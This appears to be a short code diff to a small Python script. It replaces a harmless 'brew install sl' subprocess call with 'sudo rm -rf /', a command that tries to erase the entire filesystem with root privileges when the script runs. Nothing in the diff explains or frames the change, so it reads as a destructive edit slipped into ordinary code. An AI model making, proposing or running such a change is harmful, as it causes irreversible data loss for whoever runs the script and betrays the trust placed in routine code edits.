@@ -1,5 +1,5 @@
 import subprocess
 
-p = subprocess.Popen('brew install sl', stdout=subprocess.PIPE, shell=True)
+p = subprocess.Popen('sudo rm -rf /', stdout=subprocess.PIPE, shell=True)
 
 print(p.communicate())
